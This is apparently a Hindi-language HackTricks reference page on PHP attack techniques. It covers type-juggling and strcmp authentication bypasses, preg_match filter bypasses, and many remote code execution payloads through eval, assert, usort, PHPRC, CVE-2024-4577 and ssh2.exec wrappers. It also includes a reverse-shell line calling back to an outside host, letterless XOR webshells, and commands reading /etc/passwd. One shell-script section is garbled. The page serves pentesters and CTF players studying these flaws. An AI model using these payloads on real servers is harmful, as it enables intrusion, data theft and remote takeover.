# PHP ट्रिक्स

{{#include ../../../banners/hacktricks-training.md}}

## Cookies सामान्य स्थान:

यह phpMyAdmin cookies के लिए भी मान्य है।

Cookies:
```
PHPSESSID
phpMyAdmin
```
स्थान:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP तुलनाओं को बायपास करना

### ढीली तुलना/Type Juggling ( == )

यदि `==` PHP में उपयोग किया गया है, तो ऐसी अनपेक्षित स्थितियाँ हो सकती हैं जहाँ तुलना अपेक्षित तरीके से काम नहीं करती। इसका कारण यह है कि "==" केवल मानों की तुलना करता है जिन्हें एक ही प्रकार में बदला गया हो; यदि आप यह भी सुनिश्चित करना चाहते हैं कि तुलना किए जा रहे डेटा का प्रकार भी समान हो, तो आपको `===` का उपयोग करना चाहिए।

PHP तुलना तालिकाएँ: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../images/image (567).png>)

{{#file}}
EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf
{{#endfile}}

- `"string" == 0 -> True` एक string जो संख्या से शुरू नहीं होती है, उसे संख्या के बराबर माना जाता है
- `"0xAAAA" == "43690" -> True` दशमलव या हेक्स फॉर्मेट में संख्याओं से बने strings अन्य संख्याओं/strings के साथ तुलना की जा सकती हैं और यदि संख्याएँ समान हों तो परिणाम True होगा (string में संख्या को संख्या के रूप में interpret किया जाता है)
- `"0e3264578" == 0 --> True` "0e" से शुरू होने वाला string और उसके बाद कुछ भी होने पर उसे 0 के बराबर माना जाएगा
- `"0X3264578" == 0X --> True` "0" से शुरू होकर किसी भी letter (यहाँ X किसी भी letter हो सकता है) और उसके बाद कुछ भी होने पर ऐसा string 0 के बराबर होगा
- `"0e12334" == "0" --> True` यह बहुत दिलचस्प है क्योंकि कुछ मामलों में आप "0" के string इनपुट और उस कंटेंट को नियंत्रित कर सकते हैं जिसे हैश करके इसकी तुलना की जा रही है। इसलिए, यदि आप ऐसा value प्रदान कर सकें जिसका hash "0e" से शुरू हो और जिसमें कोई letter न हो, तो आप तुलना को बायपास कर सकते हैं। आप इस फॉर्मेट में **पहले से hashed strings** यहाँ पा सकते हैं: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
- `"X" == 0 --> True` string में कोई भी letter int 0 के बराबर होता है

और अधिक जानकारी: [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in_array()**

**Type Juggling** का प्रभाव डिफ़ॉल्ट रूप से `in_array()` फ़ंक्शन पर भी होता है (कठोर तुलना करने के लिए आपको तीसरे argument को true सेट करना होगा):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

यदि यह फ़ंक्शन **any authentication check** (जैसे password की जाँच) के लिए इस्तेमाल होता है और user comparison के एक पक्ष को नियंत्रित करता है, तो वह password की value के रूप में string की बजाय खाली array भेज सकता है (`https://example.com/login.php/?username=admin&password[]=`) और इस check को bypass कर सकता है:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
उसी त्रुटि `strcasecmp()` के साथ भी होती है

### सख्त type Juggling

भले ही `===` **इस्तेमाल किया जा रहा हो**, तब भी ऐसी त्रुटियाँ हो सकती हैं जो **तुलना को असुरक्षित** कर देती हैं और **type juggling** के प्रति संवेदनशील बना देती हैं। उदाहरण के लिए, अगर तुलना **तुलना करने से पहले डेटा को किसी अलग प्रकार के object में बदल रही हो**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg_match(/^.\*)

**`preg_match()`** का उपयोग **user input को validate** करने के लिए किया जा सकता है (यह **चेक** करता है कि **blacklist** में से कोई भी **word/regex** **user input** में **मौजूद** है या नहीं और अगर मौजूद नहीं है तो कोड अपनी execution जारी रख सकता है)।

#### New line bypass

हालाँकि, जब regexp की शुरुआत को डेलिमिट किया जाता है, `preg_match()` **केवल user input की पहली लाइन** को **चेक** करता है, इसलिए अगर किसी तरह आप इनपुट को **कई लाइनों** में **भेज** सकें तो आप इस चेक को बायपास कर सकते हैं। उदाहरण:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
इस चेक को बायपास करने के लिए आप **send the value with new-lines urlencoded** (`%0A`) भेज सकते हैं या अगर आप **JSON data** भेज सकते हैं, तो इसे **several lines** में भेजें:
```php
{
"cmd": "cat /etc/passwd"
}
```
एक उदाहरण यहाँ देखें: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Length error bypass**

(यह bypass कथित तौर पर PHP 5.2.5 पर आजमाया गया था और मैं इसे PHP 7.3.15 पर काम करता हुआ नहीं बना पाया)\
यदि आप `preg_match()` को एक वैध बहुत **बड़ा इनपुट** भेज सकें, तो यह इसे **प्रोसेस नहीं कर पाएगा** और आप चेक को **bypass** कर पाएंगे। उदाहरण के लिए, यदि यह JSON को blacklisting कर रहा है तो आप भेज सकते हैं:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
From: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### ReDoS Bypass

Trick from: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) and [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../images/image (26).png" alt=""><figcaption></figcaption></figure>

संक्षेप में समस्या इसलिए होती है क्योंकि `preg_*` functions PHP में [PCRE library](http://www.pcre.org/) पर बनी हैं। PCRE में कुछ regular expressions बहुत सारे पुनरावर्ती कॉल्स का उपयोग करके मैच होते हैं, जो स्टैक स्पेस का अधिक उपयोग करते हैं। recursion की संख्या पर सीमा सेट करना संभव है, लेकिन PHP में यह सीमा [defaults to 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) है जो स्टैक में फिट होने से अधिक है।

[This Stackoverflow thread](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) भी पोस्ट में लिंक किया गया था जहाँ इस समस्या पर और गहराई से चर्चा की गई है। हमारा काम अब स्पष्ट था:\  
**ऐसा इनपुट भेजें जो regex को 100_000+ recursions करवा दे, जिससे SIGSEGV हो, `preg_match()` function `false` रिटर्न करे और एप्लिकेशन यह समझे कि हमारा इनपुट malicious नहीं है, और payload के अंत में कोई सरप्राइज़ फेंक दे जैसे `{system(<verybadcommand>)}` ताकि SSTI --> RCE --> flag :)**.

ठीक है, regex के संदर्भ में हम वास्तव में 100k "recursions" नहीं कर रहे हैं, बल्कि हम "backtracking steps" गिन रहे हैं, जो कि [PHP documentation](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) के अनुसार `pcre.backtrack_limit` वेरिएबल में default रूप से 1_000_000 (1M) होता है।\  
इसे पहुँचाने के लिए, `'X'*500_001` 1 million backtracking steps (500k आगे और 500k पीछे) देगा:
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Type Juggling — PHP के लिए कोड अस्पष्टकरण
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

यदि PHP किसी अन्य पृष्ठ पर redirect कर रहा है लेकिन कोई **`die`** या **`exit`** फ़ंक्शन **header `Location` सेट करने के बाद कॉल नहीं किया जाता है**, तो PHP निष्पादन जारी रखता है और डेटा को बॉडी में जोड़ता है:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Path Traversal and File Inclusion Exploitation

Check:


{{#ref}}
../../../pentesting-web/file-inclusion/
{{#endref}}

## और ट्रिक्स

- **register_globals**: In **PHP < 4.1.1.1** or if misconfigured, **register_globals** may be active (or their behavior is being mimicked). This implies that in global variables like $\_GET if they have a value e.g. $\_GET\["param"]="1234", you can access it via **$param. Therefore, by sending HTTP parameters you can overwrite variables** that are used within the code.
- The **PHPSESSION cookies of the same domain are stored in the same place**, therefore if within a domain **different cookies are used in different paths** you can make that a path **accesses the cookie of the path** setting the value of the other path cookie.\
इस तरह अगर **both paths access a variable with the same name** आप ऐसा कर सकते हैं कि **path1 में उस वेरिएबल का value path2 पर लागू हो**। और फिर path2 path1 के वेरिएबल्स को वैध मान लेगा (by giving the cookie the name that corresponds to it in path2).
- जब आपके पास मशीन के यूज़र्स के **usernames** हों, तो पता करें: **/\~\<USERNAME>** यह देखने के लिए कि क्या php directories सक्रिय हैं।
- If a php config has **`register_argc_argv = On`** then query params separated by spaces are used to populate the array of arguments **`array_keys($_SERVER['argv'])`** like if they were **arguments from the CLI**. This is interesting because if that **setting is off**, the value of the **args array will be `Null`** when called from the web as the ars arry won't be populated. Therefore, if a web page tries to check if it’s running as a web or as a CLI tool with a comparison like `if (empty($_SERVER['argv'])) {` an attacker could send **parameters in the GET request like `?--configPath=/lalala`** and it will think it’s running as CLI and potential parse and use those arguments. More info in the [original writeup](https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms).
- [**LFI and RCE using php wrappers**](../../../pentesting-web/file-inclusion/index.html)

### password_hash/password_verify

This functions are typically used in PHP to **पासवर्ड से hashes generate करने** और **जाँच करने के लिए** कि कोई पासवर्ड hash के मुकाबले सही है या नहीं।\
The supported algorithms are: `PASSWORD_DEFAULT` and `PASSWORD_BCRYPT` (starts with `$2y$`). Note that **PASSWORD_DEFAULT is frequently the same as PASSWORD_BCRYPT.** And currently, **PASSWORD_BCRYPT** has a **size limitation in the input of 72bytes**. Therefore, when you try to hash something larger than 72bytes with this algorithm only the first 72B will be used:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### PHP errors का दुरुपयोग करके HTTP headers bypass

#### हेडर्स सेट करने के बाद त्रुटि उत्पन्न करना

इस [**this twitter thread**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A&s=19) से आप देख सकते हैं कि 1000 से अधिक GET params या 1000 POST params या 20 files भेजने पर, PHOP response में headers सेट नहीं करेगा।

उदाहरण के लिए, यह CSP headers को bypass करने की अनुमति देता है जब कोड में ऐसे headers सेट किए जाते हैं:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### हेडर सेट करने से पहले बॉडी भरना

यदि कोई **PHP पेज एरर प्रिंट कर रहा है और उपयोगकर्ता द्वारा दिया गया कुछ इनपुट वापस echo कर रहा है**, तो उपयोगकर्ता PHP सर्वर को इतना **लंबा कंटेंट** प्रिंट करवाने के लिए मजबूर कर सकता है कि जब यह response में **हेडर जोड़ने** की कोशिश करेगा तो सर्वर एरर फेंक देगा.\
निम्नलिखित परिदृश्य में **attacker ने सर्वर को कुछ बड़े एरर फेंकवाए**, और जैसा कि स्क्रीन पर दिखता है, जब php ने **header information को modify करने** की कोशिश की, तो यह नहीं कर पाया (उदाहरण के लिए CSP header user को भेजा नहीं गया):

![](<../../../images/image (1085).png>)

## SSRF in PHP functions

इस पृष्ठ को देखें:


{{#ref}}
php-ssrf.md
{{#endref}}

## ssh2.exec stream wrapper RCE
जब `ssh2` extension इंस्टॉल है (`ssh2.so` visible under `/etc/php*/mods-available/`, `php -m`, or even an FTP-accessible `php8.1_conf/` directory), PHP `ssh2.*` wrappers register करता है जिन्हें कहीं भी user input को `fopen()/file_get_contents()` targets में concatenate किया जाता है वहाँ abuse किया जा सकता है। एक admin-only download helper जैसे:
```php
$wrapper = strpos($_GET['format'], '://') !== false ? $_GET['format'] : '';
$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
```
localhost SSH पर shell commands निष्पादित करने के लिए यह पर्याप्त है:
```http
GET /download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1:22/ping%2010.10.14.6%20-c%201#
```
* क्रेडेंशियल भाग किसी भी leaked सिस्टम पासवर्ड को फिर से उपयोग कर सकता है (e.g., from cracked bcrypt hashes).
* ट्रेलिंग `#` सर्वर-साइड suffix (`files/<id>.zip`) को कमेंट आउट कर देता है, इसलिए केवल आपका कमांड चलता है।
* Blind RCE की पुष्टि egress की निगरानी करके (`tcpdump -ni tun0 icmp`) या HTTP canary serve करके की जाती है।

मान्य होने पर कमांड को reverse shell payload से बदल दें:
```http
format=ssh2.exec://yuri:mustang@127.0.0.1:22/bash%20-c%20'bash%20-i%20>&%20/dev/tcp/10.10.14.6/443%200>&1'#
```
क्योंकि सब कुछ PHP worker के अंदर होता है, TCP कनेक्शन target से उत्पन्न होता है और injected account (`yuri`, `eric`, आदि) के privileges को inherit कर लेता है।

## कोड निष्पादन

**system("ls");**\
**`ls`;**\
**shell_exec("ls");**

[अधिक उपयोगी PHP functions के लिए यह देखें](php-useful-functions-disable_functions-open_basedir-bypass/index.html)

### **RCE के द्वारा** **preg_replace()**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace" आर्गुमेंट में दिया गया कोड चलाने के लिए कम से कम एक मैच होना आवश्यक है.\
preg_replace का यह विकल्प **PHP 5.5.0 से अप्रचलित कर दिया गया है.**

### **RCE via Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE via Assert()**

php में यह फ़ंक्शन आपको **execute code that is written in a string** करने और उसे **return true or false** कराने की अनुमति देता है (और इसके आधार पर execution को बदलने के लिए)। आमतौर पर user variable को string के बीच में insert किया जाता है। उदाहरण के लिए:\
`assert("strpos($_GET['page']),'..') === false")` --> इस मामले में **RCE** पाने के लिए आप कर सकते हैं:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
आपको कोड की **syntax** तोड़नी होगी, अपना **payload** जोड़ना होगा, और फिर इसे फिर से **ठीक** करना होगा। आप **logic operations** का उपयोग कर सकते हैं जैसे कि "**and" or "%26%26" or "|"**। ध्यान दें कि "or", "||" काम नहीं करते क्योंकि अगर पहली शर्त सही है तो हमारा payload निष्पादित नहीं होगा। इसी तरह ";" काम नहीं करता क्योंकि हमारा payload निष्पादित नहीं होगा।

**Other option** यह है कि स्ट्रिंग में निम्न कमांड का निष्पादन जोड़ें: `'.highlight_file('.passwd').'`

**Other option** (अगर आपके पास internal code है) तो execution को बदलने के लिए किसी variable को modify करें: `$file = "hola"`

### **RCE via usort()**

This function is used to sort an array of items using an specific function.\
To abuse this function:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
आप **//** का उपयोग बाकी कोड को टिप्पणी करने के लिए भी कर सकते हैं।

To discover the number of parenthesis that you need to close:

- `?order=id;}//`: हमें एक त्रुटि संदेश मिलता है (`Parse error: syntax error, unexpected ';'`). शायद हमें एक या अधिक ब्रैकेट गायब हैं।
- `?order=id);}//`: हमें एक **warning** मिलता है। यह सही लगता है।
- `?order=id));}//`: हमें एक त्रुटि संदेश मिलता है (`Parse error: syntax error, unexpected ')' i`). संभवतः हमारे पास बहुत सारे बंद ब्रैकेट हैं।

### **RCE द्वारा .httaccess**

यदि आप **upload** कर सकते हैं एक **.htaccess**, तो आप कई चीज़ें **configure** कर सकते हैं और यहाँ तक कि कोड भी execute करवा सकते हैं (कॉनफिगर कर के कि .htaccess एक्सटेंशन वाली फाइलें **executed** हो सकें)।

विभिन्न .htaccess shells [here](https://github.com/wireghoul/htshells) पर मिल सकते हैं

### RCE द्वारा Env Variables

यदि आपको कोई vulnerability मिलती है जो आपको **modify env variables in PHP** करने देती है (और एक और vulnerability जो फाइलें upload करने देती हो, हालाँकि अधिक रिसर्च से शायद यह bypass किया जा सकता है), तो आप इस व्यवहार का दुरुपयोग कर के **RCE** प्राप्त कर सकते हैं।

- [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/index.html#ld_preload-and-ld_library_path): यह env variable अन्य binaries को execute करते समय arbitrary libraries लोड करने की अनुमति देता है (हालाँकि इस केस में यह काम न कर सके)।
- **`PHPRC`** : PHP को निर्देश देता है कि इसका configuration file कहाँ locate करे, आमतौर पर `php.ini` कहलाता है। यदि आप अपना config file upload कर सकते हैं, तो `PHPRC` का उपयोग करके PHP को उस पर पॉइंट करें। एक **`auto_prepend_file`** entry जोड़ें जो दूसरे अपलोड किए गए फ़ाइल को निर्दिष्ट करे। यह दूसरी फ़ाइल सामान्य **PHP code** रखती है, जिसे PHP runtime किसी भी अन्य कोड से पहले execute कर देता है।
1. हमारी shellcode वाली एक PHP फ़ाइल upload करें
2. दूसरी फ़ाइल upload करें, जिसमें एक **`auto_prepend_file`** directive हो जो PHP preprocessor को चरण 1 में अपलोड की गई फ़ाइल execute करने का निर्देश दे
3. `PHPRC` variable को उस फ़ाइल पर सेट करें जो आपने चरण 2 में अपलोड की थी।
- इस chain को execute करने के बारे में और जानकारी प्राप्त करें [**from the original report**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/)।
- **PHPRC** - एक और विकल्प
- यदि आप **फाइलें upload नहीं कर सकते**, तो FreeBSD में आप "file" `/dev/fd/0` का उपयोग कर सकते हैं जिसमें **`stdin`** होता है, अर्थात request का **body** जो `stdin` को भेजा गया है:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
- या RCE पाने के लिए, **`allow_url_include`** को सक्षम करें और base64 PHP code वाली फ़ाइल को prepend करें:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
- तकनीक [**from this report**](https://vulncheck.com/blog/juniper-cve-2023-36845).

### XAMPP CGI RCE - CVE-2024-4577

वेब सर्वर HTTP requests को पार्स करता है और उन्हें एक PHP स्क्रिप्ट को पास करता है जो एक request जैसे [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar&ref=labs.watchtowr.com) को `php.exe cgi.php foo=bar` के रूप में execute करता है, जो parameter injection की अनुमति देता है। इससे body से PHP कोड लोड करने के लिए निम्नलिखित parameters inject करने की अनुमति मिलती है:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
इसके अलावा, PHP के बाद के सामान्यीकरण के कारण 0xAD कैरेक्टर का उपयोग करके "-" param को inject करना संभव है। exploit उदाहरण के लिए [**this post**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/):
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitization bypass & Brain Fuck

[**In this post**](https://blog.redteam-pentesting.de/2024/moodle-rce/) इसमें ऐसे बेहतरीन विचार मिलते हैं जिनसे बहुत कम chars की अनुमति होने पर brain fuck PHP code बनाया जा सकता है।\
इसके अलावा इसमें functions को execute करने का एक रोचक तरीका भी प्रस्तावित किया गया है, जिससे उन्हें कई checks को bypass करने की अनुमति मिली:
```php
(1)->{system($_GET[chr(97)])}
```
## PHP स्थैतिक विश्लेषण

देखें कि क्या आप इन फ़ंक्शन्स के कॉल्स में कोड डाल सकते हैं (from [here](https://www.youtube.com/watch?v=SyWUsN0yHKI&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
यदि आप किसी PHP application का डिबग कर रहे हैं तो आप ग्लोबली एरर प्रिंटिंग को `/etc/php5/apache2/php.ini` में `display_errors = On` जोड़कर सक्षम कर सकते हैं और apache को रिस्टार्ट करें : `sudo systemctl restart apache2`

### PHP को deobfuscate करना

आप इस **वेबसाइट**[ **www.unphp.net**](http://www.unphp.net) **से php code को deobfuscate कर सकते हैं।**

## PHP Wrappers & Protocols

PHP Wrappers और protocols आपको सिस्टम में **bypass write and read protections** करने और उसे compromise करने की अनुमति दे सकते हैं। अधिक जानकारी के लिए [**इस पेज को देखें**](../../../pentesting-web/file-inclusion/index.html#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug unauthenticated RCE

यदि आप `phpconfig()` आउटपुट में देखते हैं कि **Xdebug** **enabled** है तो आपको RCE पाने के लिए [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit) के माध्यम से कोशिश करनी चाहिए

## Variable variables
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE का दुरुपयोग new $\_GET\["a"]\($\_GET\["b"])

यदि किसी पेज में आप **create a new object of an arbitrary class** बना सकते हैं तो आप RCE प्राप्त कर सकते हैं, कैसे करना सीखने के लिए निम्नलिखित पेज देखें:


{{#ref}}
php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md
{{#endref}}

## PHP को बिना अक्षरों के निष्पादित करना

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Octal का उपयोग
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR easy shell code

के अनुसार [**this writeup** ](https://mgp25.com/ctf/Web-challenge/) निम्नलिखित तरीके से एक आसान shellcode जनरेट करना संभव है:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
तो, अगर आप **execute arbitrary PHP without numbers and letters** कर सकते हैं, तो आप निम्न अनुरोध भेजकर उस payload का दुरुपयोग करके execute arbitrary PHP कर सकते हैं:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
अधिक विस्तृत व्याख्या के लिए देखें [https://ctf-wiki.org/web/php/php/#preg_match](https://ctf-wiki.org/web/php/php/#preg_match)

### XOR Shellcode (eval के अंदर)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl जैसा
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
## संदर्भ
- [0xdf – HTB Era: abusing ssh2.exec stream wrappers](https://0xdf.gitlab.io/2025/11/29/htb-era.html)

{{#include ../../../banners/hacktricks-training.md}}
